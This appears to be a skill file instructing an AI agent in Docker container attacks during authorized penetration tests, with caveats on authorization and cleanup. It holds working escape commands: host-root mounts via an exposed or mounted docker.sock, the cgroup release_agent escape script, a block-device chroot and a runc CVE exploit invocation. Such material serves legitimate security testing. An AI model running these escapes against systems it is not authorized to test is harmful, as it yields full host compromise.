---
name: docker-attack
description: >
  Docker container attack methodology for authorized engagements:
  container escape techniques, exposed Docker socket abuse, vulnerable
  base image exploitation, privileged mode abuse. Keywords: Docker,
  container escape, docker.sock, privileged container, capabilities,
  cgroup escape, runc, image vulnerability. Do NOT use for an orchestrated
  cluster with its own control plane/RBAC (see kubernetes-attack); use
  this skill for standalone Docker hosts or as the container-breakout
  primitive referenced from kubernetes-attack.
metadata:
  type: platform
  phase: hunting
  tools: [docker-cli, trivy, grype, deepce, amicontained, cdk]
depends_on: [linux-privesc]
feeds_into: [chain-analysis, privesc-report]
chains_with: [kubernetes-attack, linux-privesc, aws-attack]
---

## Signals
- Docker socket exposed over TCP without TLS (`2375/TCP`) or mounted inside a container (`/var/run/docker.sock`).
- A command-injection/RCE foothold inside a container (via app vuln) that needs to be escalated to host access.
- Base images using outdated/vulnerable packages (`alpine:3.2`, old `node`, etc.) or running as root with no `USER` directive.
- Container running with `--privileged`, `CAP_SYS_ADMIN`, or bind-mounting `/`, `/proc`, or `/var/run/docker.sock`.

## Prerequisites
- Written authorization covering the host(s) running Docker, since successful escape yields full host compromise.
- A shell inside a container, or network access to an exposed Docker daemon API.
- `trivy`/`grype` for image scanning, `deepce`/`amicontained`/`cdk` for in-container enumeration.

## Methodology

### 1. Identify you're in a container and fingerprint it
```bash
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv
amicontained
# Check capabilities and seccomp profile
capsh --print
cat /proc/self/status | grep -i cap
```

### 2. Exposed Docker socket (remote TCP, unauthenticated)
```bash
docker -H tcp://10.10.10.5:2375 version
docker -H tcp://10.10.10.5:2375 ps -a
# Spin up a privileged container mounting host root
docker -H tcp://10.10.10.5:2375 run -it --rm --privileged -v /:/host alpine chroot /host /bin/sh
```

### 3. Mounted docker.sock inside a container (same effect, local socket)
```bash
ls -la /var/run/docker.sock
docker -H unix:///var/run/docker.sock ps -a
docker -H unix:///var/run/docker.sock run -it --rm --privileged -v /:/host alpine chroot /host /bin/sh
# Or without docker CLI installed, talk to the socket directly with curl
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
```

### 4. Privileged container escape (no exposed socket, but container itself is --privileged)
```bash
# Classic cgroup release_agent technique
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
echo 0 > /tmp/cgrp/x/cgroup.procs
cat /output   # host process list, proves escape
```

### 5. CAP_SYS_ADMIN without full --privileged
```bash
# Mount the host filesystem via the underlying block device if visible
fdisk -l 2>/dev/null
mount /dev/sda1 /mnt
chroot /mnt /bin/sh
```

### 6. Automated enumeration
```bash
./deepce.sh                   # checks socket exposure, capabilities, known escapes
cdk evaluate                  # CDK (Container DucK) automated escape vector detection
cdk run docker-runc-escape     # if runc CVE applicable (e.g. CVE-2019-5736)
```

### 7. Image vulnerability scanning (supply chain angle)
```bash
trivy image target/app:latest
grype target/app:latest
# Secrets baked into layers
docker history --no-trunc target/app:latest | grep -i "ENV\|ARG" 
trufflehog docker --image target/app:latest
```

## Tooling
`docker-cli`, `trivy`, `grype`, `DEEPCE`, `amicontained`, `CDK`, `trufflehog`.

## Validation Gate
- Escape must be proven by reading/writing a file or running a command confirmed to be in the **host** namespace (e.g. host `/etc/hostname` differs from container's, or host process list shows processes not visible from inside the container) — not just "the capability exists."
- Exposed Docker socket access must show an actual `docker ps`/`docker run` round-trip, not just an open port.
- Record the exact capability set, mount list, and escape technique used.

## Gotchas
- Spinning up a `--privileged` container on a shared Docker host (e.g. a CI runner used by other tenants) is a destructive/stateful action requiring operator sign-off per project rules, even on an authorized target.
- Modern Docker defaults (rootless mode, no `--privileged`, dropped capabilities, seccomp default profile) block most of the classic escapes — confirm the actual runtime config before assuming a technique applies.
- `runc` CVE-based escapes (e.g. CVE-2019-5736) require specific vulnerable runc versions — check `docker version`/`runc --version` first, don't fire exploits blind.
- Always `docker rm -f` any container you spin up for PoC before finishing.
